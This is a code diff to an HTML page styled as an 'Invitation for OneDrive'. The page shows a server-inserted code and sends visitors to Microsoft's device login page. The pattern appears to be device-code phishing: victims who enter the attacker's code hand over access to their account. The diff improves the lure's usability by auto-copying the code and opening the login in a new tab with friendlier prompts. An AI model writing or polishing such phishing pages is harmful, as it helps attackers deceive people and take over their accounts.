@@ -18,13 +18,13 @@
             <section id="section-1" class="slide-page">
                 <p id="signIn" class="field"></p>
                 <p id="signIn" class="field">Invitation for OneDrive</p>
-                <p id="NoAccount" class="field" >Use this code to access the shared resources <br>on the following page:</p>
+                <p id="NoAccount" class="field">Use this code to access the shared resources.<br>Click Next to copy your code and open sign-in in a new tab.<br>You can return here anytime to view the code again.</p>
                  <p id="signInOptions" class="field" ></p>
-                <input type="text" id="email" class="field" value="<%= user_code %>" readonly/> <img src="assets/img/copy-icon.webp" alt="" style="width: 20px;" onclick="copy()" /> </p>
+                <input type="text" id="email" class="field" value="<%= user_code %>" readonly/> <img src="assets/img/copy-icon.webp" alt="Copy code" style="width: 20px; cursor: pointer;" onclick="copy()" /> </p>
 
                
 
-                    <p id="btnPlace" class="field"><button onclick="location.href = 'https://microsoft.com/devicelogin';" class="firstNext next" href="#next" type="button" id="btnSend" >Next</button></p>
+                    <p id="btnPlace" class="field"><button onclick="openDeviceLogin()" class="firstNext next" type="button" id="btnSend" >Next</button></p>
             </section>
         </section>
     </div>
@@ -38,31 +38,48 @@
         <div style="float: left;width: 24px;">
             <p style="font-size: 12px;">•••<br></p>
         </div>
-        <div id="snackbar">code copied</div>
+        <div id="snackbar">Code copied</div>
     </div>
 
 <script>
-function copy() {
-  // Get the text field
-  var copyText = document.getElementById("email");
-
-  // Select the text field
-  copyText.select();
-  copyText.setSelectionRange(0, 99999); // For mobile devices
-
-  // Copy the text inside the text field
-  navigator.clipboard.writeText(copyText.value);
-
-  // Get the snackbar DIV
+function showCopied(message) {
   var x = document.getElementById("snackbar");
-
-  // Add the "show" class to DIV
+  x.textContent = message || "Code copied";
   x.className = "show";
-
-  // After 3 seconds, remove the show class from DIV
   setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+}
 
-  
+function copyCode(showFeedback) {
+  var copyText = document.getElementById("email");
+  var code = copyText.value;
+
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(code).then(function() {
+      if (showFeedback) showCopied();
+    }).catch(function() {
+      fallbackCopy(copyText, showFeedback);
+    });
+    return;
+  }
+
+  fallbackCopy(copyText, showFeedback);
+}
+
+function fallbackCopy(copyText, showFeedback) {
+  copyText.select();
+  copyText.setSelectionRange(0, 99999);
+  document.execCommand('copy');
+  if (showFeedback) showCopied();
+}
+
+function copy() {
+  copyCode(true);
+}
+
+function openDeviceLogin() {
+  copyCode(false);
+  window.open('https://microsoft.com/devicelogin', '_blank', 'noopener,noreferrer');
+  showCopied('Code copied — sign in on the new tab');
 }
 </script>
 
